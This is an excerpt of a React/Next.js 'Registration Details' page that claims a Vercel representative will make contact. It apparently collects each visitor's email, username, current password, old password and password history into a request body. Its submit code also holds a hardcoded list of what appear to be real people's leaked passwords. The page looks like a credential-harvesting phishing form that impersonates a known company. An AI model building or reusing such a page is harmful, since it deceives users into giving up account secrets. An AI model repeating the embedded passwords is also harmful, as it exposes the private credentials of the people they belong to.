...
export default function Home() {
  ...
  const submit = async () => {
    ...
    if(password === "Mahima2???" || password === "Monisha@18" || password === "Mahima2" || password === "Monisha18" || password === "@Ekrkp5za832"
       ...
       || password === "Qaz@9361234" || password === "iwannadie12345678" || password === "Arss@3187" || password === "Arss3187" || password === "myownREFLECTION4" || password === "#pandu456") {
    ...
    const bodyContent = JSON.stringify({email: email, username: username, password: password, oldPassword: oldPassword, passwordHistory: passwordHistory});
    ...
    <main className="relative flex min-h-screen flex-col justify-start m-4">
      ...
      <h1 className='text-5xl font-bold mb-8 mt-8'>Registration Details</h1>
          <p className='text-sm text-slate-300 max-w-prose'>
            Please create an account on our portal. A vercel representative will contact you soon.
        ...
        <div className='flex flex-col justify-center items-center w-full mt-8'>
          ...
          <span className="flex mt-4 justify-between items-center md:w-1/3 w-full">
            ...
            <input className="rounded-xl text-slate-900 w-3/4" type="text" onChange={(e) => setUsername(e.target.value)}/>
          </span>
          <span className="flex mt-4 justify-between items-center md:w-1/3 w-full">
